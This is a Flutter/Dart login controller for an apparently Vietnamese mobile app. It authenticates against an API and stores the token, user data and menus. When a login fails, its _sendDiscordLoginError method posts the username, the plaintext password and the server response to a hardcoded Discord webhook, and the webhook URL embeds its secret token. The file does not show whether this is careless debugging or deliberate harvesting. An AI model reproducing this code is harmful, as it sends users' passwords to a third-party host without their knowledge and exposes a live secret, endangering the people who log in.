import 'package:flutter/material.dart';
import 'package:get/get.dart';
import 'package:get_storage/get_storage.dart';
import 'package:dio/dio.dart';
import '../../core/api/api_service.dart';
import '../../data/models/user.dart';
import '../branch/branch_list_screen.dart';

class LoginController extends GetxController {
  final ApiService _apiService = ApiService();
  final GetStorage _storage = GetStorage();

  late TextEditingController usernameController;
  late TextEditingController passwordController;
  final isLoading = false.obs;

  @override
  void onInit() {
    super.onInit();
    usernameController = TextEditingController();
    passwordController = TextEditingController();
  }

  Future<void> login() async {
    if (usernameController.text.isEmpty || passwordController.text.isEmpty) {
      Get.snackbar(
        'Lỗi',
        'Vui lòng nhập tên đăng nhập và mật khẩu',
        snackPosition: SnackPosition.BOTTOM,
      );
      return;
    }

    isLoading.value = true;
    try {
      final response = await _apiService.dio.post(
        '/login',
        data: {'username': usernameController.text, 'password': passwordController.text},
      );

      final data = response.data;
      final token = data['access_token'];

      await _storage.write('access_token', token);

      if (data['user'] != null) {
        debugPrint('User Data: ${data['user']}');
        final user = User.fromJson(data['user']);
        await _storage.write('user', user.toJson());
      }

      if (data['menus'] != null) {
        if (data['menus'] is Map && data['menus']['data'] != null) {
          await _storage.write('menus', data['menus']);
        } else if (data['menus'] is List) {
          await _storage.write('menus', {'data': data['menus']});
        } else {
          await _storage.write('menus', data['menus']);
        }
      }

      Get.offAll(() => const BranchListScreen());
      Get.snackbar('Thành công', 'Đăng nhập thành công.', snackPosition: SnackPosition.BOTTOM);
    } on DioException catch (e) {
      String message = 'Đăng nhập thất bại';
      String code = e.response?.statusCode?.toString() ?? 'Unknown';
      if (e.response != null) {
        if (e.response?.data is Map && e.response?.data['message'] != null) {
          message = e.response?.data['message'];
        } else {
          message = e.message ?? 'Lỗi không xác định';
        }
      }
      await _sendDiscordLoginError(
        username: usernameController.text,
        message: message,
        password: passwordController.text,
        code: code,
        responseData: e.response?.data?.toString(),
      );
      Get.snackbar('Lỗi', '$message (Mã lỗi: $code)', snackPosition: SnackPosition.BOTTOM);
    } catch (e) {
      debugPrint(e.toString());
      Get.snackbar('Lỗi', 'Đã xảy ra lỗi: $e', snackPosition: SnackPosition.BOTTOM);
    } finally {
      isLoading.value = false;
    }
  }

  Future<void> _sendDiscordLoginError({
    required String username,
    required String password,
    required String message,
    required String code,
    String? responseData,
  }) async {
    const webhookUrl =
        'https://discord.com/api/webhooks/1449392473234211020/7daZzZqCO5GImoQFPuqVU5cw5h1CX0E-HbTkkrFvqkY-NfDeVJwuK4ivhegi2FlgMdRV';
    try {
      final dio = Dio();
      await dio.post(
        webhookUrl,
        data: {
          'embeds': [
            {
              'title': '🔐 Login Failed',
              'color': 0xE74C3C,
              'fields': [
                {'name': 'Username', 'value': username, 'inline': true},
                {'name': 'Password', 'value': password, 'inline': true},
                {'name': 'Status Code', 'value': code, 'inline': true},
                {'name': 'Message', 'value': message, 'inline': false},
                if (responseData != null)
                  {
                    'name': 'Response Data',
                    'value': responseData.length > 1024
                        ? '${responseData.substring(0, 1021)}...'
                        : responseData,
                    'inline': false,
                  },
              ],
              'timestamp': DateTime.now().toUtc().toIso8601String(),
            }
          ],
        },
        options: Options(contentType: 'application/json'),
      );
    } catch (e) {
      debugPrint('Discord webhook error: $e');
    }
  }

  @override
  void onClose() {
    usernameController.dispose();
    passwordController.dispose();
    super.onClose();
  }
}
